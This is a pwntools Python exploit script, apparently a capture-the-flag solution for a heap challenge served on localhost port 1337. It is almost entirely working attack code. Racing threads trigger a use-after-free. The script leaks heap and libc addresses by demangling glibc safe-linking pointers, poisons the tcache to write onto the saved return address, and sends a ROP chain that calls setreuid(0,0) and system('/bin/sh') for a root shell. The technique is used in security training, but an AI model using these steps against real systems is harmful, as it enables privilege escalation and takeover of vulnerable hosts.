from pwn import *

context.arch = 'amd64'
libc = ELF("/challenge/lib/libc.so.6")
def mangle(target:int, ptr:int, page_offset=0)->int:
    return target ^ ((ptr >> 12) + page_offset)

def demangle(raw:int, page_offset=0)->int:
    pos = (raw >> 12) + page_offset
    m = pos ^ raw
    return m >> 24 ^ m

def warmup_heap(r):
    r.sendline(b'malloc 8')
    r.sendline(b'malloc 9')
    r.sendline(b'malloc 10')
    r.sendline(b'free 10')
    r.sendline(b'free 9')
    r.sendline(b'free 8')
need_del = False
def thread1(r1, index):
    global need_del
    while True:
        r1.sendline(f'malloc {index} free {index}'.encode('utf-8'))
        if need_del == True:
            break

def thread2(r2, index):
    while True:
        r2.sendline(f'printf {index}'.encode('utf-8'))
        raw = r2.clean(1)
        for line in raw.splitlines():
            if b'NONE' not in line:
                leak = line.split(b'MESSAGE: ')[1]
                print(leak)
                print(f'mangled leak = {hex(unpack(leak, "all"))}'.encode('utf-8'))
                global mangled_leak
                mangled_leak = demangle(unpack(leak, 'all'), page_offset=-1)
                return


# BINARY = "/challenge/babyprime_level2.0"
# secret_addr = 0x405460

# p = process(BINARY)
r1 = remote("127.0.0.1", 1337)
r2 = remote("127.0.0.1", 1337)
r3 = remote("127.0.0.1", 1337)
r4 = remote("127.0.0.1", 1337)

warmup_heap(r1)
warmup_heap(r2)
warmup_heap(r3)
warmup_heap(r4)

r1.clean(1)
r2.clean(1)
r3.clean(1)
r4.clean(1)

# heap_leak = get_heap_leak(r1, r2)
t1 = Thread(target=thread1, args=(r1, 1))
t2 = Thread(target=thread2, args=(r2, 1))
t1.start()
t2.start()
t2.join()
need_del = True
t1.join()
print(f'heap_leak = {hex(mangled_leak)}')


heap_leak = mangled_leak
def thread4(r2, index, addr):
    for i in range(1000):
        r2.sendline(f'malloc {index} free {index}'.encode('utf-8'))


def thread3(r1, index, addr):
    for i in range(1000):
        r1.sendline(f'scanf {index} '.encode('utf-8') + addr)


secret = b''
_IO_wfile_jumps_loc = heap_leak - 0x600

while True:
    r1.sendline(f'malloc {1} printf {1}'.encode('utf-8'))
    r1.recvuntil(b'MESSAGE: ')
    result = r1.recvline()[:-1]
    print(f'result = {result}; expected = {p64(mangle(_IO_wfile_jumps_loc, heap_leak, page_offset=-1))}')
    r1.sendline(f'free {1}'.encode('utf-8'))
    print(r1.clean(1))
    if unpack(result, 'all') == mangle(_IO_wfile_jumps_loc, heap_leak, page_offset=-1):
        break
    else:
        t2 = Thread(target=thread4, args=(r1, 1, mangle(_IO_wfile_jumps_loc, heap_leak, page_offset=-1)))
        t1 = Thread(target=thread3, args=(r2, 1, p64(mangle(_IO_wfile_jumps_loc, heap_leak, page_offset=-1))))
        t2.start()
        t1.start()
        # for i in range(10000):
        #     r1.sendline(f'scanf 1 '.encode('utf-8') + p64(mangle(secret_addr, heap_leak, page_offset=-1)))
        t2.join()
        t1.join()

r1.sendline(b'malloc 11 malloc 12 printf 12')
r1.recvuntil(b'MESSAGE: ')
result = r1.recvline()[:-1]
print(result)
_IO_wfile_jumps = unpack(result, "all")
print(hex(_IO_wfile_jumps))
libc_base = _IO_wfile_jumps - libc.sym['_IO_wfile_jumps']
libc.address = libc_base
print(f'libc_Base = {hex(libc_base)}')



#saved_rip = libc_base - 0x10061d8
saved_rip = libc_base - 0x4668

print(f'saved_rip = {hex(saved_rip)}') # not safelink-aligned address
dummy_rbp = saved_rip - 0x8 + 0x30
am_addr = saved_rip - 0x18

payload = b'\x00'*0x10 + p64(dummy_rbp)

rop = ROP(libc, badchars=b"\x09\x0a\x0b\x0c\x0d\x0e\x20")
bin_sh = next(libc.search(b'/bin/sh'))
rop.setreuid(0, 0)
rop.raw(rop.rdx_rcx.address)
rop.raw(0x0)
rop.raw(0x0)
rop.raw(0x0)
rop.system(bin_sh)
payload += rop.chain()

need_del=False
t1 = Thread(target=thread1, args=(r3, 1))
t2 = Thread(target=thread2, args=(r4, 1))
t1.start()
t2.start()
t2.join()
sleep(1)
need_del = True
t1.join()
print(f'heap_leak = {hex(mangled_leak)}')
heap_leak_2 = mangled_leak

while True:
    r3.sendline(f'malloc {1} printf {1}'.encode('utf-8'))
    r3.recvuntil(b'MESSAGE: ')
    result = r3.recvline()[:-1]
    print(f'result = {result}; expected = {p64(mangle(am_addr, heap_leak_2, page_offset=-1))}')
    r3.sendline(f'free {1}'.encode('utf-8'))
    print(r3.clean(1))
    if unpack(result, 'all') == mangle(am_addr, heap_leak_2, page_offset=-1):
        break
    else:
        t2 = Thread(target=thread4, args=(r3, 1, mangle(am_addr, heap_leak_2, page_offset=-1)))
        t1 = Thread(target=thread3, args=(r4, 1, p64(mangle(am_addr, heap_leak_2, page_offset=-1))))
        t2.start()
        t1.start()
        # for i in range(10000):
        #     r1.sendline(f'scanf 1 '.encode('utf-8') + p64(mangle(secret_addr, heap_leak, page_offset=-1)))
        t2.join()
        t1.join()

r3.sendline(b'malloc 13 malloc 14 scanf 14')
r3.sendline(payload.replace(b" ", b"\x00"))
r1.sendline(b"quit")


# r1.sendline(b'send_flag ' + secret)
# print(r1.clean().decode())

